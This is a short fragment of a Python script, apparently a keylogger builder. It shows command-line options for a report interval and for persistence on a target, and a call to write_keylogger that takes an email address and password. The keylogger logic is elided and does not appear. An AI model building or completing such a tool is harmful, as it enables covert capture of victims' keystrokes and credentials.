...
def get_arguments():
    ...
    parser.add_argument("-i", "--interval", dest="interval", help="Report interval.", default=25000)
    ...
    parser.add_argument("-x", "--persistence", dest="persistence", help="Persist on target.", action="store_true")
...
write_keylogger(arguments.file_name, arguments.interval, arguments.email, arguments.password, arguments.persistence)
